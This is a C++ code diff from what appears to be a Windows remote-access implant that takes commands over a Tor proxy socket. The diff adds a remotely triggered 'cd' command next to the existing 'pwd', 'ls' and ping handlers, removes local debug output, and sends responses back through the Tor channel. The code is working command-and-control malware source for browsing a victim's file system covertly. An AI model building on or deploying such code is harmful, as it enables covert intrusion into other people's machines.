@@ -90,16 +90,17 @@ public:
                 torSock.proxySend("ping;pong;", 11);
             }
             else if (cmd == "pwd;") {
-                printf("Calling command pwd\n");
                 this->pwd();
             }
             else if (cmd == "ls;") {
-                printf("Calling command ls\n");
                 this->ls();
+            }
+            else if (cmd.starts_with("cd;")) {
+                this->cd(cmd.substr(3, cmd.size() - 1));
             }
             else {
                 std::string failResponse = "Received invalid command: " + cmd;
-                torSock.proxySend(failResponse.c_str(), failResponse.size());
+                torSock.proxySendStr(failResponse);
             }
         }
     }
@@ -115,7 +116,7 @@ public:
         GetCurrentDirectory(MAX_PATH, cwdTC);
         std::wstring cwdWStr(&cwdTC[0]);
         std::string response = "pwd;" + std::string(cwdWStr.begin(), cwdWStr.end())+";";
-        this->torSock.proxySend(response.c_str(), response.size());
+        this->torSock.proxySendStr(response);
     }
 
     void ls() {
@@ -128,7 +129,15 @@ public:
             }
             response += ";";
         }
-        this->torSock.proxySend(response.c_str(), response.size());
+        this->torSock.proxySendStr(response);
+    }
+
+    void cd(std::string path){
+        std::string response = "cd;";
+        std::wstring pathWStr(path.begin(), path.end() - 1);
+        BOOL success = SetCurrentDirectory(pathWStr.c_str());
+        response += path + ((success) ? "success" : "failed");
+        this->torSock.proxySendStr(response);
     }
     
 };
